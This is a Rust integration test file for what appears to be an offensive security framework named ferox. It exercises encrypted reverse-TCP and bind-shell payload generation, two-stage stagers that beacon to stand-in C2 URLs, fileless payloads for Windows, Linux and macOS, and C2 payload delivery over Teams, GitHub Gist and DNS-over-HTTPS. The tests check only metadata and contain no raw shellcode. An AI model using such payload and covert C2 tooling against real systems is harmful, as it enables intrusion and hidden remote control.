//! Integration tests for Phase 4 Smart Payload System
//!
//! Tests the PayloadEngine and FilelessRevTcp module functionality
//! including encryption, multi-stage payloads, and C2 integration.

use ferox::core::module::Module;
use ferox::core::payload_engine::{C2Channel, PayloadEngine, StagerConfig, TargetOS};
use ferox::modules::payloads::rev_tcp_fileless::FilelessRevTcp;

// ==================== PayloadEngine Tests ====================

#[test]
fn test_payload_engine_initialization() {
    let engine = PayloadEngine::from_passphrase("test-integration-key").unwrap();
    assert!(engine.is_safe_mode());
}

#[test]
fn test_payload_engine_encryption_roundtrip() {
    let engine = PayloadEngine::from_passphrase("test-key-123").unwrap();
    let original_data = b"This is a test payload for encryption roundtrip";

    let encrypted = engine.encrypt_payload(original_data).unwrap();
    let decrypted = engine.decrypt_payload(&encrypted).unwrap();

    assert_eq!(original_data.to_vec(), decrypted);
    assert_ne!(encrypted, original_data.to_vec()); // Ensure it was actually encrypted
}

#[test]
fn test_reverse_tcp_generation() {
    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let result = engine.generate_reverse_tcp("10.0.0.1", 4444).unwrap();

    assert!(result.metadata.encrypted);
    assert!(result.metadata.size > 0);
    assert!(!result.base64.is_empty());
    assert!(!result.hex.is_empty());
    assert!(!result.metadata.checksum_sha256.is_empty());
}

#[test]
fn test_bind_shell_generation() {
    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let result = engine.generate_bind_shell(8080).unwrap();

    assert!(result.metadata.encrypted);
    assert!(result.metadata.size > 0);
}

#[test]
fn test_stager_generation() {
    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let config = StagerConfig {
        c2_url: "https://c2.example.com/beacon".to_string(),
        c2_channel: C2Channel::HttpBeacon,
        stage2_key: Some("custom-stage2-key".to_string()),
        sleep_time: 10,
        max_retries: 5,
        ..Default::default()
    };

    let result = engine.generate_stager(&config).unwrap();

    assert!(result.metadata.encrypted);
    assert_eq!(result.stage.stage_number, 1);
    assert_eq!(result.stage.total_stages, 2);
    assert!(result.stage.c2_url.is_some());
    assert!(result.stage.next_stage_key.is_some());
}

#[test]
fn test_stage2_generation() {
    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let result = engine
        .generate_stage2("192.168.1.50", 9999, "stage2-secret")
        .unwrap();

    assert!(result.metadata.encrypted);
    assert_eq!(result.stage.stage_number, 2);
    assert_eq!(result.stage.total_stages, 2);
}

#[test]
fn test_target_os_configuration() {
    let mut engine = PayloadEngine::from_passphrase("test-key").unwrap();

    engine.set_target_os(TargetOS::Windows);
    let win_payload = engine.generate_reverse_tcp("10.0.0.1", 4444).unwrap();
    assert_eq!(win_payload.metadata.target_os, TargetOS::Windows);

    engine.set_target_os(TargetOS::Linux);
    let lin_payload = engine.generate_reverse_tcp("10.0.0.1", 4444).unwrap();
    assert_eq!(lin_payload.metadata.target_os, TargetOS::Linux);
}

#[test]
fn test_session_key_derivation() {
    let engine = PayloadEngine::from_passphrase("test-key").unwrap();

    let key1 = engine.derive_session_key("session-abc").unwrap();
    let key2 = engine.derive_session_key("session-xyz").unwrap();
    let key1_again = engine.derive_session_key("session-abc").unwrap();

    // Different sessions should have different keys
    assert_ne!(key1, key2);
    // Same session should produce same key
    assert_eq!(key1, key1_again);
}

// ==================== FilelessRevTcp Module Tests ====================

#[test]
fn test_fileless_rev_tcp_module_info() {
    let module = FilelessRevTcp::new();
    let info = module.info();

    assert_eq!(info.name, "rev_tcp_fileless");
    assert_eq!(info.category, "payloads");
    assert_eq!(info.module_type, ferox::core::module::ModuleType::Payload);
}

#[test]
fn test_fileless_rev_tcp_options() {
    let module = FilelessRevTcp::new();
    let options = module.options();

    // Verify required options exist
    let option_names: Vec<&str> = options.iter().map(|o| o.name.as_str()).collect();
    assert!(option_names.contains(&"LHOST"));
    assert!(option_names.contains(&"LPORT"));
    assert!(option_names.contains(&"TARGET_OS"));
    assert!(option_names.contains(&"STAGED"));
    assert!(option_names.contains(&"C2_URL"));
    assert!(option_names.contains(&"SAFE_MODE"));
}

#[test]
fn test_fileless_rev_tcp_set_get_options() {
    let mut module = FilelessRevTcp::new();

    // Set options
    module.set_option("LHOST", "192.168.1.100").unwrap();
    module.set_option("LPORT", "8443").unwrap();
    module.set_option("TARGET_OS", "windows").unwrap();

    // Get options
    assert_eq!(module.get_option("LHOST"), Some("192.168.1.100".to_string()));
    assert_eq!(module.get_option("LPORT"), Some("8443".to_string()));
    assert_eq!(module.get_option("TARGET_OS"), Some("windows".to_string()));
}

#[test]
fn test_fileless_rev_tcp_validation() {
    let mut module = FilelessRevTcp::new();

    // Should fail without LHOST
    assert!(module.validate().is_err());

    // Should pass with LHOST
    module.set_option("LHOST", "10.0.0.5").unwrap();
    assert!(module.validate().is_ok());

    // Should fail with invalid port
    module.set_option("LPORT", "invalid").unwrap();
    assert!(module.validate().is_err());

    // Fix port
    module.set_option("LPORT", "4444").unwrap();
    assert!(module.validate().is_ok());
}

#[test]
fn test_fileless_rev_tcp_staged_validation() {
    let mut module = FilelessRevTcp::new();
    module.set_option("LHOST", "10.0.0.5").unwrap();
    module.set_option("STAGED", "true").unwrap();

    // Should fail without C2_URL when staged
    assert!(module.validate().is_err());

    // Should pass with C2_URL
    module
        .set_option("C2_URL", "https://c2.example.com/stage2")
        .unwrap();
    assert!(module.validate().is_ok());
}

#[tokio::test]
async fn test_fileless_rev_tcp_run_single_stage() {
    let mut module = FilelessRevTcp::new();
    module.set_option("LHOST", "192.168.1.100").unwrap();
    module.set_option("LPORT", "4444").unwrap();
    module.set_option("TARGET_OS", "linux").unwrap();

    let result = module.run().await.unwrap();

    assert!(result.success);
    assert!(result.data.contains_key("payload"));
    assert!(result.data.contains_key("size"));
    assert!(result.data.contains_key("checksum"));
    assert!(result.data.contains_key("target_os"));
    assert!(result.data.contains_key("encrypted"));
    assert!(result.data.contains_key("safe_mode"));

    // Verify safe mode is true
    assert_eq!(result.data.get("safe_mode"), Some(&serde_json::json!(true)));
}

#[tokio::test]
async fn test_fileless_rev_tcp_run_staged() {
    let mut module = FilelessRevTcp::new();
    module.set_option("LHOST", "192.168.1.100").unwrap();
    module.set_option("STAGED", "true").unwrap();
    module
        .set_option("C2_URL", "https://c2.example.com/stage2")
        .unwrap();
    module.set_option("C2_CHANNEL", "http").unwrap();

    let result = module.run().await.unwrap();

    assert!(result.success);
    assert!(result.data.contains_key("stage1_payload"));
    assert!(result.data.contains_key("stage2_payload"));
    assert!(result.data.contains_key("stage2_key"));
    assert!(result.data.contains_key("c2_url"));
    assert!(result.data.contains_key("c2_channel"));
}

#[tokio::test]
async fn test_fileless_rev_tcp_check() {
    let mut module = FilelessRevTcp::new();
    module.set_option("LHOST", "10.0.0.1").unwrap();
    module.set_option("TARGET_OS", "macos").unwrap();
    module.set_option("ARCHITECTURE", "arm64").unwrap();

    let check = module.check().await.unwrap();

    assert!(check.vulnerable); // Ready to generate
    assert_eq!(check.fingerprint.get("target_os"), Some(&"macos".to_string()));
    assert!(check.fingerprint.contains_key("architecture"));
    assert!(check.fingerprint.contains_key("safe_mode"));
}

#[tokio::test]
async fn test_fileless_rev_tcp_output_formats() {
    let mut module = FilelessRevTcp::new();
    module.set_option("LHOST", "192.168.1.100").unwrap();

    // Test base64 output
    module.set_option("OUTPUT_FORMAT", "base64").unwrap();
    let result = module.run().await.unwrap();
    assert_eq!(result.data.get("format"), Some(&serde_json::json!("base64")));

    // Test hex output
    module.set_option("OUTPUT_FORMAT", "hex").unwrap();
    let result = module.run().await.unwrap();
    assert_eq!(result.data.get("format"), Some(&serde_json::json!("hex")));
}

#[test]
fn test_fileless_rev_tcp_requires_confirmation() {
    let mut module = FilelessRevTcp::new();

    // Safe mode doesn't require confirmation
    assert!(!module.requires_confirmation());

    // Production mode requires confirmation
    module.set_option("SAFE_MODE", "false").unwrap();
    assert!(module.requires_confirmation());
}

#[tokio::test]
async fn test_fileless_rev_tcp_cleanup() {
    let mut module = FilelessRevTcp::new();
    module.set_option("LHOST", "192.168.1.100").unwrap();

    // Run the module
    let _ = module.run().await.unwrap();

    // Cleanup should succeed
    assert!(module.cleanup().await.is_ok());
}

// ==================== C2 Integration Tests ====================

#[test]
fn test_c2_delivery_for_teams() {
    use ferox::core::payload_engine::C2PayloadDelivery;

    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let delivery = C2PayloadDelivery::new(engine);

    let teams_data = delivery.for_teams("192.168.1.100", 4444).unwrap();

    assert!(teams_data.contains_key("payload_base64"));
    assert!(teams_data.contains_key("checksum"));
    assert!(teams_data.contains_key("size"));
    assert!(teams_data.contains_key("encrypted"));
}

#[test]
fn test_c2_delivery_for_github_gist() {
    use ferox::core::payload_engine::C2PayloadDelivery;

    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let delivery = C2PayloadDelivery::new(engine);

    let gist_data = delivery.for_github_gist("192.168.1.100", 4444).unwrap();

    assert!(gist_data.contains_key("content"));
    assert!(gist_data.contains_key("filename"));
    assert!(gist_data.contains_key("description"));
}

#[test]
fn test_c2_delivery_for_dns_over_https() {
    use ferox::core::payload_engine::C2PayloadDelivery;

    let engine = PayloadEngine::from_passphrase("test-key").unwrap();
    let delivery = C2PayloadDelivery::new(engine);

    let config = StagerConfig {
        c2_url: "https://doh.example.com/dns-query".to_string(),
        c2_channel: C2Channel::DnsOverHttps,
        ..Default::default()
    };

    let dns_data = delivery.for_dns_over_https(&config).unwrap();

    assert!(dns_data.contains_key("total_chunks"));
    // Should have at least one chunk
    assert!(dns_data.get("total_chunks").unwrap().parse::<usize>().unwrap() > 0);
}

// ==================== Cross-Platform Tests ====================

#[test]
fn test_target_os_parsing() {
    // Windows variants
    assert_eq!("windows".parse::<TargetOS>().unwrap(), TargetOS::Windows);
    assert_eq!("win".parse::<TargetOS>().unwrap(), TargetOS::Windows);
    assert_eq!("win64".parse::<TargetOS>().unwrap(), TargetOS::Windows);

    // Linux variants
    assert_eq!("linux".parse::<TargetOS>().unwrap(), TargetOS::Linux);
    assert_eq!("lin".parse::<TargetOS>().unwrap(), TargetOS::Linux);

    // macOS variants
    assert_eq!("macos".parse::<TargetOS>().unwrap(), TargetOS::MacOS);
    assert_eq!("darwin".parse::<TargetOS>().unwrap(), TargetOS::MacOS);
    assert_eq!("osx".parse::<TargetOS>().unwrap(), TargetOS::MacOS);

    // Any
    assert_eq!("any".parse::<TargetOS>().unwrap(), TargetOS::Any);
    assert_eq!("*".parse::<TargetOS>().unwrap(), TargetOS::Any);
}

#[test]
fn test_all_platforms_generate_payloads() {
    let platforms = vec![TargetOS::Windows, TargetOS::Linux, TargetOS::MacOS, TargetOS::Any];

    for platform in platforms {
        let mut engine = PayloadEngine::from_passphrase("test-key").unwrap();
        engine.set_target_os(platform.clone());

        let result = engine.generate_reverse_tcp("10.0.0.1", 4444).unwrap();

        assert!(result.metadata.size > 0, "Failed for {:?}", platform);
        assert!(result.metadata.encrypted, "Failed for {:?}", platform);
        assert_eq!(result.metadata.target_os, platform);
    }
}
